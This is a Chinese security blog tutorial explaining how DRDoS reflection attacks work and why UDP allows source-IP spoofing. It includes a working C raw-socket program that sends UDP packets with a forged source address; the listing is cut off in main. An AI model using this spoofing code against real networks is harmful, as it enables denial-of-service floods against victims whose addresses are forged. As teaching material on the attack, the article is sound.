<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析 - 倾旋的博客</title><meta name=theme-color><meta name=description content="0x01 什么是DRDOS
DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。
0x02 DRDOS的攻击流程
DRDoS要完成一次反射放大攻击：

1 攻击者，必须提前需要把攻击数据存放在所有的在线肉鸡或者反射服务器之上。
2 攻击者，必须伪造IP源头。发送海量伪造IP来源的请求。当然这里的IP就是受害者的IP地址。
3 反射服务器，必须可以反射数据，运行良好稳定。最好是请求数据少，返回数据成万倍增加。

0x03 DRDOS的特性
（如果没有理解UDP协议，请不要向下继续阅读……会越来越混乱）
根据上述概念可以理解为，DRDOS需要一个能够伪造IP头的协议，这个协议最突出的就是UDP协议了。

使用基于 TCP 协议的通信不可以对源 IP 地址进行伪造
使用基于 UDP 协议的通信可以对源 IP 地址进行伪造

TCP 不能伪造源 IP 地址是因为 TCP 协议中的三次握手的存在，如果源 IP 地址被修改，那么三次握手将无法达成。
而 UDP 则不同，UDP 中不存在三次握手，那么发送端就只要发送数据即可，而接收端只要接收数据即可。所以，在 TCP 中不能对源 IP 地址进行伪造，而 UDP 中则可以。
UDP协议不需要握手，直接发送接收，下面我来通过小故事来形象的描述UDP中的伪造IP头攻击：

假设有三个用户，Allen、Jerry、Tom.
Jerry与Tom一次正常的UDP请求
Jerry说：“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”
此时Tom的4478端口接收到一个UDP报文，需要回复内容，回复给谁呢，接下来需要根据报文中的IP头确定是谁发送的
通过Jerry的话确定发送方是Jerry，而Jerry的端口是4787，那么Tom就会将数据传送给Jerry
Tom说：“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”
Allen进行一次RDOS攻击
Allen说：“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”
此时Tom接收到报文，根据上面这句话确定了发送人是Jerry，目的端口是4787
Tom说：“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”
这个过程当中，Jerry并没有参与通信，但是接到了一个从Tom那里发送过来的UDP数据报文
0x04 编写一个伪造IP头的C语言程序

/usr/include/netinet/ip.h
这里面定义了IP头
struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ip_hl:4;		/* header length */
    unsigned int ip_v:4;		/* version */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ip_v:4;		/* version */
    unsigned int ip_hl:4;		/* header length */
#endif
    uint8_t ip_tos;			/* type of service */
    unsigned short ip_len;		/* total length */
    unsigned short ip_id;		/* identification */
    unsigned short ip_off;		/* fragment offset field */
#define	IP_RF 0x8000			/* reserved fragment flag */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
    uint8_t ip_ttl;			/* time to live */
    uint8_t ip_p;			/* protocol */
    unsigned short ip_sum;		/* checksum */
    struct in_addr ip_src, ip_dst;	/* source and dest address */
  };

/usr/include/netinet/udp.h"><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.150.0"><meta itemprop=name content="使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析"><meta itemprop=description content="本文概述一下使用C语言发送伪造源IP的UDP请求及DRDoS拒绝服务攻击原理剖析"><meta itemprop=datePublished content="2018-03-04T00:00:00+00:00"><meta itemprop=dateModified content="2018-03-04T00:00:00+00:00"><meta itemprop=wordCount content="643"><meta itemprop=keywords content="C++/C"><meta property="og:url" content="https://payloads.online/archivers/2018-03-04/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析"><meta property="og:description" content="本文概述一下使用C语言发送伪造源IP的UDP请求及DRDoS拒绝服务攻击原理剖析"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-03-04T00:00:00+00:00"><meta property="article:modified_time" content="2018-03-04T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析"><meta name=twitter:description content="本文概述一下使用C语言发送伪造源IP的UDP请求及DRDoS拒绝服务攻击原理剖析"><link rel=canonical href=https://payloads.online/archivers/2018-03-04/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析</h1><div class="text-xs antialiased opacity-60"><time>Mar 4, 2018</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><h2 id=0x01-什么是drdos>0x01 什么是DRDOS</h2><p>DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。</p><h2 id=0x02-drdos的攻击流程>0x02 DRDOS的攻击流程</h2><p>DRDoS要完成一次反射放大攻击：</p><ul><li>1 攻击者，必须提前需要把攻击数据存放在所有的在线肉鸡或者反射服务器之上。</li><li>2 攻击者，必须伪造IP源头。发送海量伪造IP来源的请求。当然这里的IP就是受害者的IP地址。</li><li>3 反射服务器，必须可以反射数据，运行良好稳定。最好是请求数据少，返回数据成万倍增加。</li></ul><h2 id=0x03-drdos的特性>0x03 DRDOS的特性</h2><p>（如果没有理解UDP协议，请不要向下继续阅读……会越来越混乱）</p><p>根据上述概念可以理解为，DRDOS需要一个能够伪造IP头的协议，这个协议最突出的就是UDP协议了。</p><ol><li>使用基于 TCP 协议的通信不可以对源 IP 地址进行伪造</li><li>使用基于 UDP 协议的通信可以对源 IP 地址进行伪造</li></ol><p>TCP 不能伪造源 IP 地址是因为 TCP 协议中的三次握手的存在，如果源 IP 地址被修改，那么三次握手将无法达成。</p><p>而 UDP 则不同，UDP 中不存在三次握手，那么发送端就只要发送数据即可，而接收端只要接收数据即可。所以，在 TCP 中不能对源 IP 地址进行伪造，而 UDP 中则可以。</p><p>UDP协议不需要握手，直接发送接收，下面我来通过小故事来形象的描述UDP中的伪造IP头攻击：</p><blockquote><p>假设有三个用户，Allen、Jerry、Tom.</p></blockquote><h3 id=jerry与tom一次正常的udp请求>Jerry与Tom一次正常的UDP请求</h3><p><code>Jerry说：</code>“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”</p><p>此时Tom的4478端口接收到一个UDP报文，需要回复内容，回复给谁呢，接下来需要根据报文中的IP头确定是谁发送的</p><p>通过Jerry的话确定发送方是Jerry，而Jerry的端口是4787，那么Tom就会将数据传送给Jerry</p><p><code>Tom说：</code>“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”</p><h3 id=allen进行一次rdos攻击>Allen进行一次RDOS攻击</h3><p><code>Allen说：</code>“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”</p><p>此时Tom接收到报文，根据上面这句话确定了发送人是Jerry，目的端口是4787</p><p><code>Tom说：</code>“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”</p><p>这个过程当中，Jerry并没有参与通信，但是接到了一个从Tom那里发送过来的UDP数据报文</p><h2 id=0x04-编写一个伪造ip头的c语言程序>0x04 编写一个伪造IP头的C语言程序</h2><blockquote><p>/usr/include/netinet/ip.h</p></blockquote><p>这里面定义了IP头</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ip</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span><span style=color:#75715e>#if __BYTE_ORDER == __LITTLE_ENDIAN
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> ip_hl:<span style=color:#ae81ff>4</span>;		<span style=color:#75715e>/* header length */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> ip_v:<span style=color:#ae81ff>4</span>;		<span style=color:#75715e>/* version */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#endif
</span></span></span><span style=display:flex><span><span style=color:#75715e>#if __BYTE_ORDER == __BIG_ENDIAN
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> ip_v:<span style=color:#ae81ff>4</span>;		<span style=color:#75715e>/* version */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> ip_hl:<span style=color:#ae81ff>4</span>;		<span style=color:#75715e>/* header length */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#endif
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint8_t</span> ip_tos;			<span style=color:#75715e>/* type of service */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> ip_len;		<span style=color:#75715e>/* total length */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> ip_id;		<span style=color:#75715e>/* identification */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> ip_off;		<span style=color:#75715e>/* fragment offset field */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define	IP_RF 0x8000			</span><span style=color:#75715e>/* reserved fragment flag */</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define	IP_DF 0x4000			</span><span style=color:#75715e>/* dont fragment flag */</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define	IP_MF 0x2000			</span><span style=color:#75715e>/* more fragments flag */</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define	IP_OFFMASK 0x1fff		</span><span style=color:#75715e>/* mask for fragmenting bits */</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint8_t</span> ip_ttl;			<span style=color:#75715e>/* time to live */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint8_t</span> ip_p;			<span style=color:#75715e>/* protocol */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> ip_sum;		<span style=color:#75715e>/* checksum */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>in_addr</span> ip_src, ip_dst;	<span style=color:#75715e>/* source and dest address */</span>
</span></span><span style=display:flex><span>  };
</span></span></code></pre></div><blockquote><p>/usr/include/netinet/udp.h</p></blockquote><p>这里面定义了UDP报文结构</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>udphdr</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  __extension__ <span style=color:#66d9ef>union</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> uh_sport;	<span style=color:#75715e>/* source port */</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> uh_dport;	<span style=color:#75715e>/* destination port */</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> uh_ulen;		<span style=color:#75715e>/* udp length */</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> uh_sum;		<span style=color:#75715e>/* udp checksum */</span>
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> source;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> dest;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> len;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>uint16_t</span> check;
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>  };
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>程序如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e> * @file ip_udp_send.c
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;arpa/inet.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/ip.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/udp.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* ip首部长度 */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define IP_HEADER_LEN sizeof(struct ip)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>/* udp首部长度 */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define UDP_HEADER_LEN sizeof(struct udphdr)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>/* ip首部 + udp首部长度 */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define IP_UDP_HEADER_LEN IP_HEADER_LEN + UDP_HEADER_LEN
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>err_exit</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>err_msg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    perror(err_msg);
</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* 填充ip首部 */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ip</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>fill_ip_header</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>src_ip, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>dst_ip, <span style=color:#66d9ef>int</span> ip_packet_len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ip</span> <span style=color:#f92672>*</span>ip_header;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ip_header <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ip</span> <span style=color:#f92672>*</span>)malloc(IP_HEADER_LEN);
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_v <span style=color:#f92672>=</span> IPVERSION;
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_hl <span style=color:#f92672>=</span> IP_HEADER_LEN <span style=color:#f92672>/</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_tos <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_len <span style=color:#f92672>=</span> htons(ip_packet_len);
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_id <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_off <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_ttl <span style=color:#f92672>=</span> MAXTTL;
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_p <span style=color:#f92672>=</span> IPPROTO_UDP;        <span style=color:#75715e>/* 这里是UDP */</span>
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_sum <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_src.s_addr <span style=color:#f92672>=</span> inet_addr(src_ip);
</span></span><span style=display:flex><span>    ip_header<span style=color:#f92672>-&gt;</span>ip_dst.s_addr <span style=color:#f92672>=</span> inet_addr(dst_ip);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ip_header;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* 填充udp首部 */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>udphdr</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>fill_udp_header</span>(<span style=color:#66d9ef>int</span> src_port, <span style=color:#66d9ef>int</span> dst_port, <span style=color:#66d9ef>int</span> udp_packet_len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>udphdr</span> <span style=color:#f92672>*</span>udp_header;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    udp_header <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>udphdr</span> <span style=color:#f92672>*</span>)malloc(UDP_HEADER_LEN);
</span></span><span style=display:flex><span>    udp_header<span style=color:#f92672>-&gt;</span>source <span style=color:#f92672>=</span> htons(src_port);
</span></span><span style=display:flex><span>    udp_header<span style=color:#f92672>-&gt;</span>dest <span style=color:#f92672>=</span> htons(dst_port);
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* 这里的长度是整个UDP报文 */</span>
</span></span><span style=display:flex><span>    udp_header<span style=color:#f92672>-&gt;</span>len <span style=color:#f92672>=</span> htons(udp_packet_len);
</span></span><span style=display:flex><span>    udp_header<span style=color:#f92672>-&gt;</span>check <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> udp_header;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* 发送ip_udp报文 */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>ip_udp_send</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>src_ip, <span style=color:#66d9ef>int</span> src_port, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>dst_ip, <span style=color:#66d9ef>int</span> dst_port, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>data)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ip</span> <span style=color:#f92672>*</span>ip_header;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>udphdr</span> <span style=color:#f92672>*</span>udp_header;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr_in</span> dst_addr;
</span></span><span style=display:flex><span>    socklen_t sock_addrlen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr_in</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> data_len <span style=color:#f92672>=</span> strlen(data);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> ip_packet_len <span style=color:#f92672>=</span> IP_UDP_HEADER_LEN <span style=color:#f92672>+</span> data_len;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> udp_packet_len <span style=color:#f92672>=</span> UDP_HEADER_LEN <span style=color:#f92672>+</span> data_len;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> buf[ip_packet_len];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> sockfd, ret_len, on <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    bzero(<span style=color:#f92672>&amp;</span>dst_addr, sock_addrlen);
</span></span><span style=display:flex><span>    dst_addr.sin_family <span style=color:#f92672>=</span> PF_INET;
</span></span><span style=display:flex><span>    dst_addr.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(dst_ip);
</span></span><span style=display:flex><span>    dst_addr.sin_port <span style=color:#f92672>=</span> htons(dst_port);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* 创建udp原始套接字 */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((sockfd <span style=color:#f92672>=</span> socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        err_exit(<span style=color:#e6db74>&#34;socket()&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* 开启IP_HDRINCL，自定义IP首部 */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, <span style=color:#f92672>&amp;</span>on, <span style=color:#66d9ef>sizeof</span>(on)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        err_exit(<span style=color:#e6db74>&#34;setsockopt()&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* ip首部 */</span>
</span></span><span style=display:flex><span>    ip_header <span style=color:#f92672>=</span> fill_ip_header(src_ip, dst_ip, ip_packet_len);
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* udp首部 */</span>
</span></span><span style=display:flex><span>    udp_header <span style=color:#f92672>=</span> fill_udp_header(src_port, dst_port, udp_packet_len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    bzero(buf, ip_packet_len);
</span></span><span style=display:flex><span>    memcpy(buf, ip_header, IP_HEADER_LEN);
</span></span><span style=display:flex><span>    memcpy(buf <span style=color:#f92672>+</span> IP_HEADER_LEN, udp_header, UDP_HEADER_LEN);
</span></span><span style=display:flex><span>    memcpy(buf <span style=color:#f92672>+</span> IP_UDP_HEADER_LEN, data, data_len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* 发送报文 */</span>
</span></span><span style=display:flex><span>    ret_len <span style=color:#f92672>=</span> sendto(sockfd, buf, ip_packet_len, <span style=color:#ae81ff>0</span>, (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>dst_addr, sock_addrlen);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ret_len <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;sendto() ok!!!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> printf(<span style=color:#e6db74>&#34;sendto() failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    close(sockfd);
</span></span><span style=display:flex><span>    free(ip_header);
</span></span><span style=display:flex><span>    free(udp_header);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[])
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;usage:%s src_ip src_port dst_ip dst_port data</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
